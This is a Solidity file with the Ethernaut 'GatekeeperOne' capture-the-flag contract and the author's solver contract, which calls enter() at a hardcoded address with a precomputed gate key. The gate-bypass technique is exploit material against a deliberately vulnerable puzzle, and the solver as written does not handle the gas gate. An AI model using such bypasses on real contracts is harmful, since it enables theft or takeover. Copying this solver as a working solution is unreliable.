// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    // need to call this from a contract
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    // imo i need to give 8191 more than the usual gas? idk
    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    // 0x000000010000f3de is the _gatKey
    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatebasherOne {
    IGatekeeperOne gatekeeperone =
        IGatekeeperOne(0xFC7D8A110DAE73D50928F9A69183707dd4736dd8);

    function bash() public {
        gatekeeperone.enter(0x000000010000f3de);
    }
}
